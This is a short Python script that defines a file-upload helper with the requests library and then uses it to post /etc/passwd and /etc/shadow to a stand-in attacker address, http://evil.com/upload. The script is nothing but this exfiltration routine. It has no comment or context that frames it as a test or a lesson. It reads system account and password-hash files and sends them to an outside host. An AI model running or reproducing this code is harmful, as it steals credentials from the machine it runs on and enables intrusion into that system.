import requests

def upload_file(url, file_path):
    with open(file_path, 'rb') as f:
        files = {'file': f}
        requests.post(url, files=files)

upload_file('http://evil.com/upload', '/etc/passwd')
upload_file('http://evil.com/upload', '/etc/shadow')